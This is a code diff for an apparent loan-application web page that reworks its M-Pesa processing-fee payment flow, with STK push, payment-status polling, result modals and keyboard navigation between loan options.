-                    <p><strong>Processing Fee:</strong> Ksh ${selectedLoan.fee}</p>
-                    <p><strong>Total Repayment:</strong> Ksh ${(selectedLoan.amount * 1.1).toLocaleString()}</p>
-                    <hr style="margin: 16px 0;">
-                    <p style="color: #2e7d32; font-weight: 600;">You will receive an M-Pesa prompt to pay the processing fee of Ksh ${selectedLoan.fee}</p>
-                    <p style="font-size: 0.85rem; color: #666; margin-top: 8px;">Phone: ${userData.phone_number}</p>
-                </div>
-            `,
-            icon: 'question',
-            showCancelButton: true,
-            confirmButtonText: 'Proceed to Payment',
-            cancelButtonText: 'Cancel',
-            confirmButtonColor: '#2e7d32'
+        paymentReference = paymentResponse.reference;
+
+        // Show instruction modal while verifying
+        Swal.fire({
+          title: 'STK Push Sent',
+          html: `
+            <div style="text-align:center">
+              <i class="fas fa-mobile-alt" style="font-size:46px;color:var(--primary);margin-bottom:12px"></i>
+              <p style="margin:6px 0 0">Check your phone for the M-Pesa prompt and enter your PIN.</p>
+              <p style="margin:8px 0 0;color:var(--muted);font-size:0.9rem">Phone: ${normalizedPhone}</p>
+              <div style="margin-top:12px;padding:10px;background:#fafafa;border-radius:8px;font-size:0.9rem">
+                <strong>Verifying payment...</strong>
+              </div>
+            </div>
+          `,
+          icon: 'info',
+          showConfirmButton: false,
+          allowOutsideClick: false
         });
 
-        if (result.isConfirmed) {
-            Swal.fire({
-                title: 'Initiating Payment',
-                html: 'Please wait...',
-                allowOutsideClick: false,
-                didOpen: () => Swal.showLoading()
-            });
+        // 3. Poll verification endpoint
+        const paymentSuccess = await checkPaymentStatus(paymentReference, 24, 3000);
 
-            try {
-                // First normalize the phone number
-                const normalizedPhone = await normalizePhoneNumber(userData.phone_number);
-                
-                const paymentResponse = await sendPayHeroSTK(
-                    normalizedPhone,
-                    selectedLoan.fee,
-                    selectedLoan.amount
-                );
+        if (paymentSuccess) {
+          // success modal
+          await Swal.fire({
+            title: 'Payment Received',
+            html: `
+              <div style="text-align:center">
+                <i class="fas fa-check-circle" style="font-size:64px;color:#22c55e;margin-bottom:12px"></i>
+                <p style="margin:6px 0 0">Your payment of <strong>${formatKsh(selectedLoan.fee)}</strong> was received.</p>
+                <p style="color:var(--muted);margin-top:8px;font-size:0.92rem">Approving loan and preparing disbursement...</p>
+              </div>
+            `,
+            icon: 'success',
+            showConfirmButton: false,
+            timer: 1700
+          });
 
-                if (paymentResponse && paymentResponse.reference) {
-                    paymentReference = paymentResponse.reference;
-                    
-                    Swal.fire({
-                        title: 'STK Push Sent!',
-                        html: `
-                            <div style="text-align:center;">
-                                <i class="fas fa-mobile-alt" style="font-size: 48px; color: #2e7d32; margin-bottom: 16px;"></i>
-                                <p>Check your phone for the M-Pesa prompt</p>
-                                <p style="font-size: 0.9rem; color: #666; margin-top: 12px;">
-                                    Enter your M-Pesa PIN to complete payment of <strong>Ksh ${selectedLoan.fee}</strong>
-                                </p>
-                                <p style="font-size: 0.85rem; color: #999; margin-top: 8px;">
-                                    Phone: ${normalizedPhone}
-                                </p>
-                                <div style="margin-top: 16px; padding: 12px; background: #f0f0f0; border-radius: 8px;">
-                                    <p style="font-size: 0.85rem; margin: 0;">Verifying payment...</p>
-                                </div>
-                            </div>
-                        `,
-                        icon: 'info',
-                        showConfirmButton: false,
-                        allowOutsideClick: false
-                    });
+          // persist approved loan and redirect
+          const approved = {
+            ...userData,
+            ...selectedLoan,
+            paymentReference,
+            approvedAt: new Date().toISOString()
+          };
+          sessionStorage.setItem('loanApproved', JSON.stringify(approved));
 
-                    // Verify payment using serverless function
-                    try {
-                        const paymentSuccess = await checkPaymentStatus(paymentReference);
-
-                        if (paymentSuccess) {
-                            await Swal.fire({
-                                title: 'Payment Successful!',
-                                html: `
-                                    <div style="text-align:center;">
-                                        <i class="fas fa-check-circle" style="font-size: 64px; color: #4caf50; margin-bottom: 16px;"></i>
-                                        <p>Your loan of <strong>Ksh ${selectedLoan.amount.toLocaleString()}</strong> has been approved!</p>
-                                        <p style="color: #666; font-size: 0.9rem; margin-top: 12px;">Processing disbursement...</p>
-                                    </div>
-                                `,
-                                icon: 'success',
-                                timer: 2000,
-                                showConfirmButton: false
-                            });
-
-                            sessionStorage.setItem('loanApproved', JSON.stringify({
-                                ...userData,
-                                ...selectedLoan,
-                                paymentReference,
-                                approvedAt: new Date().toISOString()
-                            }));
-
-                            // Redirect to dashboard only on successful payment
-                            window.location.href = 'dash.html';
-                        }
-                    } catch (verificationError) {
-                        console.error('Payment verification error:', verificationError);
-                        throw new Error(verificationError.message || 'Payment verification failed');
-                    }
-                } else {
-                    throw new Error('Payment initiation failed - no reference received');
-                }
-            } catch (error) {
-                console.error('Payment error:', error);
-                Swal.fire({
-                    title: 'Payment Failed',
-                    html: `
-                        <p>${error.message || 'Unable to process payment. Please try again.'}</p>
-                        <p style="font-size: 0.85rem; color: #666; margin-top: 12px;">
-                            Please ensure your phone number is correct and try again.
-                        </p>
-                    `,
-                    icon: 'error',
-                    confirmButtonText: 'Try Again',
-                    confirmButtonColor: '#2e7d32'
-                });
-            }
+          // Go to dashboard
+          window.location.href = 'dash.html';
+        } else {
+          throw new Error('Payment not confirmed');
         }
+
+      } catch (err) {
+        console.error('Payment flow error', err);
+        // friendly error modal
+        Swal.fire({
+          title: 'Payment Failed',
+          html: `
+            <p style="margin:0">${err.message || 'Unable to process payment. Please try again.'}</p>
+            <p style="margin-top:8px;color:var(--muted);font-size:0.92rem">Make sure your phone has network & M-Pesa is available.</p>
+          `,
+          icon: 'error',
+          confirmButtonText: 'Try Again',
+          confirmButtonColor: 'var(--primary)'
+        });
+      }
     });
-</script>
+
+    /* -------------------------
+       Accessibility & keyboard: enable arrow navigation between options
+       ------------------------- */
+    loanGrid.addEventListener('keydown', (e) => {
+      const focusable = loanOptions;
+      const idx = focusable.indexOf(document.activeElement);
+      if (e.key === 'ArrowRight' || e.key === 'ArrowDown') {
+        e.preventDefault();
+        const next = focusable[(idx + 1) % focusable.length];
+        next.focus();
+      } else if (e.key === 'ArrowLeft' || e.key === 'ArrowUp') {
+        e.preventDefault();
+        const prev = focusable[(idx - 1 + focusable.length) % focusable.length];
+        prev.focus();
+      }
+    });
+
+    /* -------------------------
+       Pre-select if user returning
+       ------------------------- */
+    (function restoreSelection(){
+      if (userData.loan_amount) {
+        const el = loanOptions.find(o => Number(o.dataset.amount) === Number(userData.loan_amount));
+        if (el) selectAfterLoad(el);
+      }
+      function selectAfterLoad(el){
+        // slight delay so styles render nicely
+        setTimeout(() => {
+          el.classList.add('selected');
+          selectedLoan = { amount: Number(el.dataset.amount), fee: Number(el.dataset.fee) };
+          applyBtn.disabled = false;
+          applyBtn.removeAttribute('aria-disabled');
+          updateSummary();
+        }, 160);
+      }
+    })();
+
+  </script>
 </body>
+
 </html>
